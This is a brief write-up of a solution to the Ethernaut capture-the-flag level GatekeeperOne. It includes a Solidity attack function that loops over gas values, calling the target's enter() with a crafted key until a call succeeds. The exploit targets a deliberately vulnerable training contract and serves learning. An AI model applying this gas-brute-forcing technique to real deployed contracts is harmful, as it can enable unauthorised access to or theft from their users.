# 13_GatekeeperOne Project

## Challenge: Ethernaut CTF Level 13 - GatekeeperOne

- **Victory condition**: Pass through GatekeeperOne
- **Knowledge required**: Modifiers, gasleft(), import hardhat/console.log, precise gas limit calculation, contract loops

## Solution Strategy:

1. Break down GatekeeperOne into part1, part2, part3, and use hardhat/console.log to precisely calculate gas and keys
2. Even for contracts already deployed on testnets where hardhat/console.log cannot be used, you can still add public variables and use getter functions in scripts to investigate and debug

## Solidity:

```solidity
function attack(uint64 gasToUse) public {
    // Call the enter function of GatekeeperOne with the gateKey
    // gas offset usually comes in around 210, give a buffer of 60 on each side
    for (uint256 i = 0; i < 500; i++){
        (result, ) = gatekeeperOneAddress.call{gas: gasToUse + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if (result) {
            // The magic number is 256
            gasOffset = i;
            result = true;
            break;
        } else {
            looptime += 1;
            continue;
        }
    }
    // require(success, "Attack failed");
}    
```

1. gatekeeperOneAddress.call does not automatically revert the transaction when it fails. The program will continue executing